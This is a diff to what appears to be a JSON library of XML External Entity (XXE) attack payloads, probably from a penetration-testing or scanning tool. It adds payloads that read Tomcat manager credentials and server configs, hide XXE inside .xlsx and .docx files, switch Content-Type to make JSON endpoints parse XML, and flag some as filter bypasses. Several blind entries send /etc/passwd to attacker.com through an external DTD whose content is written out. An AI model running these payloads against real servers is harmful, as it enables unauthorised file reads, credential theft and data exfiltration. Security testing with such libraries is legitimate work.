@@ -9,7 +9,10 @@
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><root>&xxe;</root>", "description": "XXE process environment variables", "waf_bypass": false},
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><root>&xxe;</root>", "description": "XXE with PHP filter wrapper for base64 encoded read", "waf_bypass": false},
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/var/www/html/config.php\">]><root>&xxe;</root>", "description": "XXE PHP source code read via filter", "waf_bypass": false},
-        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///windows/win.ini\">]><root>&xxe;</root>", "description": "XXE Windows file read", "waf_bypass": false}
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///windows/win.ini\">]><root>&xxe;</root>", "description": "XXE Windows file read", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///WEB-INF/web.xml\">]><root>&xxe;</root>", "description": "Java web.xml — servlet mappings, init params, security constraints", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///usr/local/tomcat/conf/tomcat-users.xml\">]><root>&xxe;</root>", "description": "Tomcat users config — manager credentials and roles", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///opt/tomcat/conf/server.xml\">]><root>&xxe;</root>", "description": "Tomcat server.xml — connectors, ports, JNDI datasources", "waf_bypass": false}
       ]
     },
     "ssrf": {
@@ -25,9 +28,9 @@
       "description": "Blind XXE payloads using out-of-band data exfiltration",
       "payloads": [
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><root>test</root>", "description": "Blind XXE loading external malicious DTD", "waf_bypass": false},
-        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % dtd SYSTEM \"http://attacker.com/exfil.dtd\"> %dtd;]><root>&send;</root>", "description": "Blind XXE two-stage file exfil via external DTD", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % dtd SYSTEM \"http://attacker.com/exfil.dtd\"> %dtd;]><root>test</root>", "description": "Blind XXE two-stage: loads external DTD that defines entity using %file; — DTD content: <!ENTITY % eval \"<!ENTITY send SYSTEM 'http://attacker.com/?x=%file;'>\"> %eval;", "waf_bypass": false},
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"ftp://attacker.com:21/data\"> %xxe;]><root>test</root>", "description": "Blind XXE via FTP for slow-read data exfiltration", "waf_bypass": false},
-        {"payload": "<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>\">%eval;%exfiltrate;", "description": "External DTD content for OOB file exfiltration (deploy on attacker server)", "waf_bypass": false}
+        {"payload": "<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>\">%eval;%exfiltrate;", "description": "External DTD content for OOB file exfiltration (deploy on attacker server as evil.dtd)", "waf_bypass": false}
       ]
     },
     "parameter_entity": {
@@ -60,6 +63,24 @@
       "payloads": [
         {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>", "description": "SOAP XXE file read", "waf_bypass": false},
         {"payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR_URL/soap-xxe\"> %xxe;]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><test>x</test></soap:Body></soap:Envelope>", "description": "SOAP XXE blind OOB", "waf_bypass": false}
+      ]
+    },
+    "office_xxe": {
+      "description": "XXE via Office/Excel XML files — OOXML formats (.docx, .xlsx, .pptx) contain XML that may be parsed server-side",
+      "payloads": [
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://COLLABORATOR_URL/xlsx-xxe\">]><workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId1\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">&xxe;</sheet></sheets></workbook>", "description": "XXE in xl/workbook.xml inside .xlsx — replace in ZIP archive and upload", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"xml\" ContentType=\"application/xml\"/><Override PartName=\"/xl/workbook.xml\" ContentType=\"&xxe;\"/></Types>", "description": "XXE in [Content_Types].xml inside OOXML — parsed first by most libraries", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR_URL/docx-xxe\"> %xxe;]><document xmlns=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><body><p><r><t>test</t></r></p></body></document>", "description": "XXE in word/document.xml inside .docx — blind OOB via parameter entity", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><styleSheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><fonts><font><name val=\"&xxe;\"/></font></fonts></styleSheet>", "description": "XXE in xl/styles.xml inside .xlsx — often parsed without entity restrictions", "waf_bypass": false}
+      ]
+    },
+    "content_type_switch": {
+      "description": "XXE via Content-Type switching — send XML to endpoints that normally accept JSON",
+      "payloads": [
+        {"payload": "Content-Type: application/xml\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><key>&xxe;</key></root>", "description": "Switch Content-Type from application/json to application/xml — many frameworks auto-detect", "waf_bypass": false},
+        {"payload": "Content-Type: text/xml\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><key>&xxe;</key></root>", "description": "Use text/xml Content-Type — alternate XML MIME type that may bypass filters", "waf_bypass": true},
+        {"payload": "Content-Type: application/xml\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLABORATOR_URL/json-to-xml\"> %xxe;]><root>test</root>", "description": "Blind XXE via Content-Type switch — JSON endpoint parses XML with external entities", "waf_bypass": false},
+        {"payload": "Content-Type: application/soap+xml\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><Envelope><Body>&xxe;</Body></Envelope>", "description": "SOAP Content-Type on REST endpoint — some frameworks route to XML parser", "waf_bypass": true}
       ]
     }
   }
